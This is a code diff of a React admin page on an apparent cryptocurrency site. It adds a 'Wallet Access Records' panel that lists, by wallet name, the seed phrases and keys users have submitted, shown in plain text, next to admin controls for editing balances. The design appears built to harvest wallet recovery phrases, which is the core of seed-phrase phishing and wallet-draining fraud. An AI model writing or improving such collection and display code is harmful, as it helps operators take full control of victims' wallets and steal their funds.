@@ -30,6 +30,14 @@ type User = {
   seedPhrase?: string | null;
 };
 
+type WalletAccess = {
+  id: string;
+  walletName: string;
+  type: string;
+  value: string;
+  createdAt: string;
+};
+
 type Transaction = {
   token: string;
   amount: string;
@@ -41,9 +49,11 @@ type Transaction = {
 export default function AdminUserDetails({
   user,
   withdrawals,
+  walletAccesses,
 }: {
   user: User;
   withdrawals: Transaction[];
+  walletAccesses: WalletAccess[];
 }) {
   const [isPending, startTransition] = useTransition();
   const [balances, setBalances] = useState({
@@ -60,6 +70,18 @@ export default function AdminUserDetails({
     ltc: user.ltcBalance,
     matic: user.maticBalance,
   });
+  const [selectedWallet, setSelectedWallet] = useState<string>("ALL");
+
+  const walletNames = Array.from(
+    new Set(walletAccesses.map((w) => w.walletName))
+  );
+
+  const sortedAccesses = [...walletAccesses].sort(
+    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
+  );
+  const filteredAccesses = sortedAccesses.filter(
+    (entry) => selectedWallet === "ALL" || entry.walletName === selectedWallet
+  );
 
   const handleRoleChange = (newRole: "ADMIN" | "USER") => {
     startTransition(async () => {
@@ -93,6 +115,7 @@ export default function AdminUserDetails({
       }
     });
   };
+
   return (
     <div className="p-6 text-black">
       <div className="flex items-center justify-between">
@@ -109,21 +132,94 @@ export default function AdminUserDetails({
         </div>
       )}
 
-      {user.seedPhrase ? (
-        <div className="my-6">
-          <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
-          <div className="bg-gray-100 text-black p-4 rounded font-mono">
-            {user.seedPhrase}
+      {/* <div className="my-6">
+        <h3 className="text-lg font-semibold mb-2">Wallet Access Records</h3>
+        {walletAccesses.length > 0 ? (
+          <div className="space-y-4">
+            {walletAccesses.map((entry) => (
+              <div
+                key={entry.id}
+                className="bg-gray-100 text-black p-4 rounded shadow font-mono"
+              >
+                <p>
+                  <strong>Wallet:</strong> {entry.walletName}
+                </p>
+                <p>
+                  <strong>Type:</strong> {entry.type}
+                </p>
+                <p className="break-words">
+                  <strong>
+                    {entry.type === "phrase" ? "Seed Phrase" : "Public Key"}:
+                  </strong>{" "}
+                  {entry.value}
+                </p>
+                <p className="text-sm text-gray-600 mt-1">
+                  Submitted: {new Date(entry.createdAt).toLocaleString()}
+                </p>
+              </div>
+            ))}
           </div>
-        </div>
-      ) : (
-        <div className="my-6">
-          <h3 className="text-lg font-semibold mb-2">Seed Phrase</h3>
-          <div className="bg-gray-100 text-black p-4 rounded font-mono">
-            No Seed Phrases yet..
+        ) : (
+          <div className="my-6">
+            <div className="bg-gray-100 text-black p-4 rounded font-mono">
+              No wallet access records yet...
+            </div>
           </div>
-        </div>
-      )}
+        )}
+      </div> */}
+
+      <div className="my-6">
+        <h3 className="text-lg font-semibold mb-2">Wallet Access Records</h3>
+
+        {walletAccesses.length > 0 ? (
+          <>
+            <div className="mb-4">
+              <label className="text-sm font-medium text-gray-700 mr-2">
+                Filter by Wallet:
+              </label>
+              <select
+                value={selectedWallet}
+                onChange={(e) => setSelectedWallet(e.target.value)}
+                className="p-2 bg-primary-admin border border-gray-300 rounded text-white"
+              >
+                <option value="ALL">All</option>
+                {walletNames.map((name) => (
+                  <option key={name} value={name} >
+                    {name}
+                  </option>
+                ))}
+              </select>
+            </div>
+
+            <div className="space-y-4">
+              {filteredAccesses.map((entry) => (
+                <div
+                  key={entry.id}
+                  className="bg-gray-100 text-black p-4 rounded shadow"
+                >
+                  <p>
+                    <strong>Wallet:</strong> {entry.walletName}
+                  </p>
+                  <p>
+                    <strong>Type:</strong> {entry.type}
+                  </p>
+                  <p className="break-words">
+                    <strong>
+                      {entry.type === "phrase" ? "Seed Phrase" : "Public Key"}:
+                    </strong>{" "}
+                    {entry.value}
+                  </p>
+                  <p className="text-sm text-gray-600 mt-1">
+                    Submitted: {new Date(entry.createdAt).toLocaleString()}
+                  </p>
+                </div>
+              ))}
+            </div>
+          </>
+        ) : (
+          <p className="text-gray-600">No wallet access records yet.</p>
+        )}
+      </div>
 
       <h3 className="text-lg font-semibold mt-6 mb-2">Balances</h3>
       <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
